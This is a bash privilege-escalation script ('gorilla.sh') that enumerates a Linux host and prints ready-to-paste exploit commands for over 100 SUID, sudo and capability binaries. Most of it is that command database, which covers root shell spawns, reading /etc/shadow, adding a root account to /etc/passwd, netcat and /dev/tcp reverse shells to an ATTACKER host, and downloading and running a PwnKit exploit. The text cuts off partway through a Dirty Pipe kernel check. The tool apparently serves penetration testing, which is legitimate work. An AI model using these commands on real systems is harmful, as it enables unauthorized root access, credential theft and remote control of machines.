#!/bin/bash
# ============================================================================
# gorilla.sh — Linux Privilege Escalation Suite
# Improved fork of LinEnum-ng by Strikoder
# github.com/bachrudinashari/linenum-gorilla
#
# Improvements over LinEnum-ng:
#   - Embedded exploit commands for 100+ SUID/sudo binaries (copy-paste ready)
#   - Capabilities exploitation with commands
#   - Priority-sorted output (CRITICAL → LOW)
#   - Writable cron script detection
#   - Additional password hunting (SNMP, API keys, env files)
#   - Improved container escape commands
# ============================================================================

# Color codes
CYAN="\033[0;36m"
RED="\033[0;31m"
LRED="\033[1;31m"
GREEN="\033[0;32m"
LBLUE="\033[1;34m"
LMAGENTA="\033[1;35m"
YELLOW="\033[0;33m"
BOLD='\033[1m'
BGREEN='\033[38;5;46m'
NC="\033[0m"
WHITE='\033[38;5;231m'

# Banner
echo -e "${BGREEN}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════╗"
echo "  ║   ██████╗  ██████╗ ██████╗ ██╗██╗     ██╗      █████╗     ║"
echo "  ║  ██╔════╝ ██╔═══██╗██╔══██╗██║██║     ██║     ██╔══██╗    ║"
echo "  ║  ██║  ███╗██║   ██║██████╔╝██║██║     ██║     ███████║    ║"
echo "  ║  ██║   ██║██║   ██║██╔══██╗██║██║     ██║     ██╔══██║    ║"
echo "  ║  ╚██████╔╝╚██████╔╝██║  ██║██║███████╗███████╗██║  ██║    ║"
echo "  ║   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝    ║"
echo "  ╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}${WHITE}  🦍 gorilla.sh v1.0 — Linux Privilege Escalation Suite"
echo -e "     github.com/bachrudinashari/linenum-gorilla${NC}"
echo ""
echo -e "\033[1;31;103m Privilege Escalation Vector \033[0m"

# ============================================================================
# EXPLOIT COMMANDS DATABASE
# Returns exploit commands for a given binary name + mode (suid/sudo/cap)
# ============================================================================
get_exploit() {
    local bin="$1"
    local mode="$2"  # suid, sudo, cap

    case "$bin" in
        # === SHELLS / INTERPRETERS ===
        bash)
            case $mode in
                suid) echo -e "  ${LMAGENTA}bash -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo bash${NC}" ;;
                cap)  echo -e "  ${LMAGENTA}bash -p${NC}" ;;
            esac ;;
        sh)
            case $mode in
                suid) echo -e "  ${LMAGENTA}sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo sh${NC}" ;;
            esac ;;
        dash)
            case $mode in
                suid) echo -e "  ${LMAGENTA}dash -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo dash${NC}" ;;
            esac ;;
        zsh)
            case $mode in
                suid) echo -e "  ${LMAGENTA}zsh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo zsh${NC}" ;;
            esac ;;
        csh|tcsh)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo $bin${NC}" ;;
            esac ;;
        fish)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo fish${NC}" ;;
            esac ;;
        ksh)
            case $mode in
                suid) echo -e "  ${LMAGENTA}ksh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo ksh${NC}" ;;
            esac ;;

        # === PYTHON ===
        python|python2|python3|python3.*)
            case $mode in
                suid) echo -e "  ${LMAGENTA}$bin -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo $bin -c 'import os; os.system(\"/bin/bash\")'${NC}" ;;
                cap)  echo -e "  ${LMAGENTA}$bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'${NC}" ;;
            esac ;;

        # === PERL ===
        perl|perl5*)
            case $mode in
                suid) echo -e "  ${LMAGENTA}perl -e 'exec \"/bin/sh\";'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo perl -e 'exec \"/bin/bash\";'${NC}" ;;
                cap)  echo -e "  ${LMAGENTA}perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'${NC}" ;;
            esac ;;

        # === RUBY ===
        ruby|ruby2*)
            case $mode in
                suid) echo -e "  ${LMAGENTA}ruby -e 'exec \"/bin/sh -p\"'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo ruby -e 'exec \"/bin/bash\"'${NC}" ;;
            esac ;;

        # === PHP ===
        php|php7*|php8*)
            case $mode in
                suid) echo -e "  ${LMAGENTA}php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo php -r 'system(\"/bin/bash\");'${NC}" ;;
            esac ;;

        # === LUA ===
        lua|lua5*)
            case $mode in
                suid) echo -e "  ${LMAGENTA}lua -e 'os.execute(\"/bin/sh -p\")'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo lua -e 'os.execute(\"/bin/bash\")'${NC}" ;;
            esac ;;

        # === NODE ===
        node|nodejs)
            case $mode in
                suid) echo -e "  ${LMAGENTA}node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'${NC}" ;;
            esac ;;

        # === FILE MANAGERS / EDITORS ===
        find)
            case $mode in
                suid) echo -e "  ${LMAGENTA}find . -exec /bin/sh -p \\; -quit${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo find . -exec /bin/bash \\; -quit${NC}" ;;
            esac ;;
        vim|vim.basic|vim.tiny|vi)
            case $mode in
                suid) echo -e "  ${LMAGENTA}vim -c ':!/bin/sh -p'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo vim -c ':!/bin/bash'${NC}" ;;
            esac ;;
        nano)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo nano /etc/passwd  # edit directly${NC}" ;;
            esac ;;
        less)
            case $mode in
                suid) echo -e "  ${LMAGENTA}less /etc/passwd  # then type: !/bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo less /etc/passwd  # then type: !/bin/bash${NC}" ;;
            esac ;;
        more)
            case $mode in
                suid) echo -e "  ${LMAGENTA}more /etc/passwd  # then type: !/bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo more /etc/passwd  # then type: !/bin/bash${NC}" ;;
            esac ;;
        man)
            case $mode in
                suid) echo -e "  ${LMAGENTA}man man  # then type: !/bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo man man  # then type: !/bin/bash${NC}" ;;
            esac ;;

        # === COMMON SUID BINARIES ===
        nmap)
            case $mode in
                suid) echo -e "  ${LMAGENTA}# nmap 2.02-5.21: nmap --interactive → !sh${NC}\n  ${LMAGENTA}# nmap 5.21+: echo 'os.execute(\"/bin/sh -p\")' > /tmp/x.nse && nmap --script=/tmp/x.nse${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}# sudo nmap --interactive → !bash${NC}\n  ${LMAGENTA}# Or: echo 'os.execute(\"/bin/bash\")' > /tmp/x.nse && sudo nmap --script=/tmp/x.nse${NC}" ;;
            esac ;;
        awk|gawk|mawk|nawk)
            case $mode in
                suid) echo -e "  ${LMAGENTA}awk 'BEGIN {system(\"/bin/sh -p\")}'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo awk 'BEGIN {system(\"/bin/bash\")}'${NC}" ;;
            esac ;;
        sed)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo sed -n '1e exec /bin/bash' /etc/hosts${NC}" ;;
            esac ;;
        env)
            case $mode in
                suid) echo -e "  ${LMAGENTA}env /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo env /bin/bash${NC}" ;;
            esac ;;
        cp)
            case $mode in
                suid) echo -e "  ${LMAGENTA}# Copy /etc/shadow or overwrite /etc/passwd${NC}\n  ${LMAGENTA}cp /etc/shadow /tmp/shadow_copy${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}# Overwrite /etc/passwd with crafted version${NC}\n  ${LMAGENTA}sudo cp /tmp/passwd_new /etc/passwd${NC}" ;;
            esac ;;
        mv)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo mv /tmp/passwd_new /etc/passwd${NC}" ;;
            esac ;;
        tar)
            case $mode in
                suid) echo -e "  ${LMAGENTA}tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash${NC}" ;;
            esac ;;
        zip)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}TF=\$(mktemp -u); sudo zip \$TF /etc/hosts -T -TT 'bash #'${NC}" ;;
            esac ;;
        wget)
            case $mode in
                suid) echo -e "  ${LMAGENTA}# Overwrite /etc/passwd: wget http://ATTACKER/passwd -O /etc/passwd${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo wget http://ATTACKER/passwd -O /etc/passwd${NC}" ;;
            esac ;;
        curl)
            case $mode in
                suid) echo -e "  ${LMAGENTA}curl file:///etc/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo curl file:///etc/shadow${NC}\n  ${LMAGENTA}# Overwrite: sudo curl http://ATTACKER/passwd -o /etc/passwd${NC}" ;;
            esac ;;
        tee)
            case $mode in
                suid) echo -e "  ${LMAGENTA}echo 'hacker:\$1\$hacker\$xyz:0:0::/root:/bin/bash' | tee -a /etc/passwd${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}echo 'hacker:\$1\$hacker\$xyz:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd${NC}" ;;
            esac ;;
        cat)
            case $mode in
                suid) echo -e "  ${LMAGENTA}cat /etc/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo cat /etc/shadow${NC}" ;;
            esac ;;
        head|tail)
            case $mode in
                suid) echo -e "  ${LMAGENTA}$bin -c 999 /etc/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo $bin -c 999 /etc/shadow${NC}" ;;
            esac ;;
        dd)
            case $mode in
                suid) echo -e "  ${LMAGENTA}dd if=/etc/shadow of=/tmp/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}echo 'hacker:\$1\$x\$x:0:0::/root:/bin/bash' | sudo dd of=/etc/passwd oflag=append conv=notrunc${NC}" ;;
            esac ;;
        base64)
            case $mode in
                suid) echo -e "  ${LMAGENTA}base64 /etc/shadow | base64 -d${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo base64 /etc/shadow | base64 -d${NC}" ;;
            esac ;;
        xxd)
            case $mode in
                suid) echo -e "  ${LMAGENTA}xxd /etc/shadow | xxd -r${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo xxd /etc/shadow | xxd -r${NC}" ;;
            esac ;;
        openssl)
            case $mode in
                suid) echo -e "  ${LMAGENTA}openssl enc -in /etc/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}# Reverse shell: sudo openssl s_client -connect ATTACKER:PORT${NC}\n  ${LMAGENTA}# Read file: sudo openssl enc -in /etc/shadow${NC}" ;;
            esac ;;
        git)
            case $mode in
                suid) echo -e "  ${LMAGENTA}git help config  # then: !/bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo git -p help config  # then: !/bin/bash${NC}" ;;
            esac ;;
        ftp)
            case $mode in
                suid) echo -e "  ${LMAGENTA}ftp  # then: !/bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo ftp  # then: !/bin/bash${NC}" ;;
            esac ;;
        ssh)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x${NC}" ;;
            esac ;;
        scp)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}TF=\$(mktemp); echo 'bash 0<&2 1>&2' > \$TF; chmod +x \$TF; sudo scp -S \$TF x y:${NC}" ;;
            esac ;;
        nc|netcat|ncat)
            case $mode in
                suid) echo -e "  ${LMAGENTA}# Reverse shell: nc ATTACKER PORT -e /bin/sh${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo nc ATTACKER PORT -e /bin/bash${NC}" ;;
            esac ;;
        socat)
            case $mode in
                suid) echo -e "  ${LMAGENTA}socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo socat stdin exec:/bin/bash,pty,stderr,setsid,sigint,sane${NC}" ;;
            esac ;;
        docker)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash${NC}" ;;
            esac ;;
        strace)
            case $mode in
                suid) echo -e "  ${LMAGENTA}strace -o /dev/null /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo strace -o /dev/null /bin/bash${NC}" ;;
            esac ;;
        ltrace)
            case $mode in
                suid) echo -e "  ${LMAGENTA}ltrace -b -L /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo ltrace -b -L /bin/bash${NC}" ;;
            esac ;;
        gdb)
            case $mode in
                suid) echo -e "  ${LMAGENTA}gdb -nx -ex 'python import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")' -ex quit${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo gdb -nx -ex '!bash' -ex quit${NC}" ;;
            esac ;;
        screen)
            case $mode in
                suid) echo -e "  ${LMAGENTA}# Screen 4.5.0: https://www.exploit-db.com/exploits/41154${NC}\n  ${LMAGENTA}screen -x  # attach to root session if exists${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo screen${NC}" ;;
            esac ;;
        tmux)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo tmux${NC}" ;;
            esac ;;
        script)
            case $mode in
                suid) echo -e "  ${LMAGENTA}script -q /dev/null -c '/bin/sh -p'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo script -q /dev/null -c '/bin/bash'${NC}" ;;
            esac ;;
        expect)
            case $mode in
                suid) echo -e "  ${LMAGENTA}expect -c 'spawn /bin/sh -p; interact'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo expect -c 'spawn /bin/bash; interact'${NC}" ;;
            esac ;;
        mount)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo mount -o bind /bin/bash /bin/mount; sudo mount${NC}" ;;
            esac ;;
        doas)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}doas /bin/bash${NC}" ;;
            esac ;;
        pkexec)
            case $mode in
                suid) echo -e "  ${LMAGENTA}# PwnKit CVE-2021-4034: https://github.com/ly4k/PwnKit${NC}\n  ${LMAGENTA}# curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit && chmod +x PwnKit && ./PwnKit${NC}" ;;
            esac ;;
        chown)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo chown \$(whoami) /etc/shadow  # then crack hashes${NC}" ;;
            esac ;;
        chmod)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo chmod 777 /etc/shadow  # then read hashes${NC}\n  ${LMAGENTA}sudo chmod u+s /bin/bash  # then bash -p${NC}" ;;
            esac ;;
        chroot)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo chroot / /bin/bash${NC}" ;;
            esac ;;
        rsync)
            case $mode in
                suid) echo -e "  ${LMAGENTA}rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo rsync -e 'sh -c \"bash 0<&2 1>&2\"' 127.0.0.1:/dev/null${NC}" ;;
            esac ;;
        nice)
            case $mode in
                suid) echo -e "  ${LMAGENTA}nice /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo nice /bin/bash${NC}" ;;
            esac ;;
        ionice)
            case $mode in
                suid) echo -e "  ${LMAGENTA}ionice /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo ionice /bin/bash${NC}" ;;
            esac ;;
        taskset)
            case $mode in
                suid) echo -e "  ${LMAGENTA}taskset 1 /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo taskset 1 /bin/bash${NC}" ;;
            esac ;;
        time)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo /usr/bin/time /bin/bash${NC}" ;;
            esac ;;
        timeout)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo timeout --foreground 9999 /bin/bash${NC}" ;;
            esac ;;
        stdbuf)
            case $mode in
                suid) echo -e "  ${LMAGENTA}stdbuf -i0 /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo stdbuf -i0 /bin/bash${NC}" ;;
            esac ;;
        setarch)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo setarch \$(arch) /bin/bash${NC}" ;;
            esac ;;
        watch)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo watch -x bash -c 'reset; exec bash 1>&0 2>&0'${NC}" ;;
            esac ;;
        service)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo service ../../bin/bash .${NC}" ;;
            esac ;;
        systemctl)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo systemctl  # then: !bash${NC}" ;;
            esac ;;
        journalctl)
            case $mode in
                suid) echo -e "  ${LMAGENTA}journalctl  # then: !/bin/sh -p  (needs small terminal)${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo journalctl  # then: !/bin/bash  (needs small terminal)${NC}" ;;
            esac ;;
        mysql)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo mysql -e '\\! /bin/bash'${NC}" ;;
            esac ;;
        psql)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo psql -c 'CREATE TABLE t(c text); COPY t FROM PROGRAM \"/bin/bash\";'${NC}" ;;
            esac ;;
        apache2|apache)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo apache2 -f /etc/shadow  # leaks shadow as error${NC}" ;;
            esac ;;
        nginx)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}# Write nginx config to serve root files, then read${NC}" ;;
            esac ;;
        ed)
            case $mode in
                suid) echo -e "  ${LMAGENTA}ed  # then: !/bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo ed  # then: !/bin/bash${NC}" ;;
            esac ;;
        pico)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo pico  # Ctrl+T then type: /bin/bash${NC}" ;;
            esac ;;
        emacs)
            case $mode in
                suid) echo -e "  ${LMAGENTA}emacs -Q -nw --eval '(term \"/bin/sh -p\")'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo emacs -Q -nw --eval '(term \"/bin/bash\")'${NC}" ;;
            esac ;;
        rlwrap)
            case $mode in
                suid) echo -e "  ${LMAGENTA}rlwrap /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo rlwrap /bin/bash${NC}" ;;
            esac ;;
        xargs)
            case $mode in
                suid) echo -e "  ${LMAGENTA}xargs -a /dev/null sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo xargs -a /dev/null bash${NC}" ;;
            esac ;;
        dpkg)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo dpkg -l  # then: !/bin/bash${NC}" ;;
            esac ;;
        rpm)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo rpm --eval '%{lua:os.execute(\"/bin/bash\")}'${NC}" ;;
            esac ;;
        apt-get|apt)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo apt-get changelog apt  # then: !/bin/bash${NC}" ;;
            esac ;;
        pip|pip3)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}TF=\$(mktemp -d); echo 'import os;os.system(\"/bin/bash\")' > \$TF/setup.py; sudo pip install \$TF${NC}" ;;
            esac ;;
        gem)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo gem open -e '/bin/bash -c /bin/bash' rdoc${NC}" ;;
            esac ;;
        cpan)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo cpan  # then: ! exec '/bin/bash'${NC}" ;;
            esac ;;
        make)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}COMMAND='/bin/bash'; sudo make -s --eval=\"\\\$(/bin/bash >&2)\" 2>/dev/null${NC}" ;;
            esac ;;
        gcc|cc)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo gcc -wrapper /bin/bash,-s .${NC}" ;;
            esac ;;
        diff)
            case $mode in
                suid) echo -e "  ${LMAGENTA}diff --line-format=%L /dev/null /etc/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo diff --line-format=%L /dev/null /etc/shadow${NC}" ;;
            esac ;;
        sort)
            case $mode in
                suid) echo -e "  ${LMAGENTA}sort -m /etc/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo sort -m /etc/shadow${NC}" ;;
            esac ;;
        uniq)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo uniq /etc/shadow${NC}" ;;
            esac ;;
        file)
            case $mode in
                suid) echo -e "  ${LMAGENTA}file -f /etc/shadow  # leaks first line as error${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo file -f /etc/shadow${NC}" ;;
            esac ;;
        strings)
            case $mode in
                suid) echo -e "  ${LMAGENTA}strings /etc/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo strings /etc/shadow${NC}" ;;
            esac ;;
        od)
            case $mode in
                suid) echo -e "  ${LMAGENTA}od -An -c /etc/shadow | sed 's/  */ /g'${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo od -An -c /etc/shadow${NC}" ;;
            esac ;;
        hd|hexdump)
            case $mode in
                suid) echo -e "  ${LMAGENTA}hd /etc/shadow${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo hd /etc/shadow${NC}" ;;
            esac ;;
        rev)
            case $mode in
                suid) echo -e "  ${LMAGENTA}rev /etc/shadow | rev${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo rev /etc/shadow | rev${NC}" ;;
            esac ;;
        cut)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo cut -d '' -f1 /etc/shadow${NC}" ;;
            esac ;;
        nl)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo nl /etc/shadow${NC}" ;;
            esac ;;
        jq)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo jq -Rn 'input' /etc/shadow${NC}" ;;
            esac ;;
        tclsh)
            case $mode in
                suid) echo -e "  ${LMAGENTA}echo 'exec /bin/sh -p <@stdin >@stdout 2>@stderr' | tclsh${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}echo 'exec /bin/bash <@stdin >@stdout 2>@stderr' | sudo tclsh${NC}" ;;
            esac ;;
        wish)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}echo 'exec /bin/bash <@stdin >@stdout 2>@stderr' | sudo wish${NC}" ;;
            esac ;;
        busybox)
            case $mode in
                suid) echo -e "  ${LMAGENTA}busybox sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo busybox sh${NC}" ;;
            esac ;;
        su)
            case $mode in
                suid) echo -e "  ${LMAGENTA}# Standard SUID — try: su root (if you have password)${NC}" ;;
            esac ;;
        run-parts)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo run-parts --new-session --regex '^bash$' /bin${NC}" ;;
            esac ;;
        start-stop-daemon)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo start-stop-daemon --start -n x -S -x /bin/bash${NC}" ;;
            esac ;;
        nsenter)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo nsenter /bin/bash${NC}" ;;
            esac ;;
        unshare)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo unshare /bin/bash${NC}" ;;
            esac ;;
        capsh)
            case $mode in
                suid) echo -e "  ${LMAGENTA}capsh --gid=0 --uid=0 --${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo capsh --${NC}" ;;
            esac ;;
        aa-exec)
            case $mode in
                suid) echo -e "  ${LMAGENTA}aa-exec /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo aa-exec /bin/bash${NC}" ;;
            esac ;;
        ip)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}sudo ip netns add foo; sudo ip netns exec foo /bin/bash; sudo ip netns delete foo${NC}" ;;
            esac ;;
        crontab)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}# sudo crontab -e → add: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'${NC}" ;;
            esac ;;
        at)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}echo '/bin/bash' | sudo at now${NC}" ;;
            esac ;;
        flock)
            case $mode in
                suid) echo -e "  ${LMAGENTA}flock -u / /bin/sh -p${NC}" ;;
                sudo) echo -e "  ${LMAGENTA}sudo flock -u / /bin/bash${NC}" ;;
            esac ;;
        pdb|pdb3)
            case $mode in
                sudo) echo -e "  ${LMAGENTA}TF=\$(mktemp); echo 'import os; os.system(\"/bin/bash\")' > \$TF; sudo pdb \$TF  # then: cont${NC}" ;;
            esac ;;
        *)
            return 1 ;;
    esac
    return 0
}

# ============================================================================
# ARGUMENT PARSING
# ============================================================================
PASSWORD=""
USERNAME=""

for arg in "$@"; do
    if [ "$arg" = "--help" ] || [ "$arg" = "-h" ]; then
        echo -e "${LBLUE}Usage: $0 [OPTIONS]${NC}"
        echo ""
        echo -e "  ${CYAN}-p PASSWORD${NC}  Supply password for sudo -l check"
        echo -e "  ${CYAN}-u USERNAME${NC}  Hunt files related to a specific user"
        echo -e "  ${CYAN}-h, --help${NC}   Show this help"
        echo ""
        echo -e "${WHITE}Examples:${NC}"
        echo -e "  $0                     # Full run, no creds"
        echo -e "  $0 -p 'Summer2024!'    # Test sudo with password"
        echo -e "  $0 -u john             # Hunt files for user john"
        echo -e "  $0 -p 'pass' -u admin  # Both"
        exit 0
    fi
done

while getopts ":p:u:" opt; do
    case $opt in
        p) PASSWORD="$OPTARG" ;;
        u) USERNAME="$OPTARG" ;;
        \?) echo -e "${RED}[-] Invalid option: -$OPTARG${NC}" >&2 ;;
        :) echo -e "${RED}[-] Option -$OPTARG requires an argument.${NC}" >&2 ;;
    esac
done

if [ -n "$PASSWORD" ]; then
    echo -e "\n${LMAGENTA}[*] Password provided via -p — will use for sudo -l check${NC}"
else
    echo -e "\n${YELLOW}[*] No password provided. Tip: run with -p 'PASSWORD' to also check sudo with credentials.${NC}"
fi
[ -n "$USERNAME" ] && echo -e "${LMAGENTA}[*] Username target: ${WHITE}$USERNAME${NC}"

# ============================================================================
# BASIC SYSTEM INFO
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║               BASIC SYSTEM INFORMATION                    ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Current user and groups:"
id 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Hostname:"
hostname 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Kernel version:"
uname -r
kernel_version=$(uname -r)

echo -e "\n${YELLOW}[+] ${NC}Full system information:"
uname -a 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}OS Release:"
cat /etc/os-release 2>/dev/null | grep PRETTY_NAME

echo -e "\n${YELLOW}[+] ${NC}Uptime:"
uptime 2>/dev/null | sed 's/^ *//'

# ============================================================================
# KERNEL EXPLOIT CHECK
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║          KERNEL EXPLOIT VULNERABILITY CHECK               ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

kernel_base=$(echo $kernel_version | cut -d '-' -f1)
ver1=$(echo $kernel_base | cut -d '.' -f1)
ver2=$(echo $kernel_base | cut -d '.' -f2)
ver3=$(echo $kernel_base | cut -d '.' -f3)
echo -e "\n${YELLOW}[+] ${NC}Parsed kernel: $ver1.$ver2.$ver3"

# PwnKit
echo -e "\n${YELLOW}[+] ${NC}PwnKit (CVE-2021-4034):"
if [ -f /usr/bin/pkexec ]; then
    if [ -u /usr/bin/pkexec ]; then
        pkexec_version=$(/usr/bin/pkexec --version 2>&1 | grep -o '[0-9][0-9]*\.[0-9][0-9]*' | head -1)
        if [ ! -z "$pkexec_version" ]; then
            if awk "BEGIN {exit !($pkexec_version < 0.120)}"; then
                echo -e "\033[1;31;103m VULNERABLE pkexec $pkexec_version < 0.120 \033[0m"
                get_exploit pkexec suid
            else
                echo -e "${GREEN}Not vulnerable (pkexec >= 0.120)${NC}"
            fi
        else
            echo -e "${YELLOW}Could not determine version — check manually${NC}"
        fi
    else
        echo -e "${GREEN}pkexec no SUID bit${NC}"
    fi
else
    echo -e "${GREEN}pkexec not found${NC}"
fi

# Dirty Pipe
echo -e "\n${YELLOW}[+] ${NC}Dirty Pipe (CVE-2022-0847) [kernel 5.8 - 5.16.10]:"
if (( ${ver1:-0} == 5 && ${ver2:-0} >= 8 && ${ver2:-0} <= 16 )); then
    if ! (( ${ver2:-0} == 16 && ${ver3:-0} >= 11 )); then
        echo -e "\033[1;31;103m VULNERABLE — Kernel $ver1.$ver2.$ver3 \033[0m"
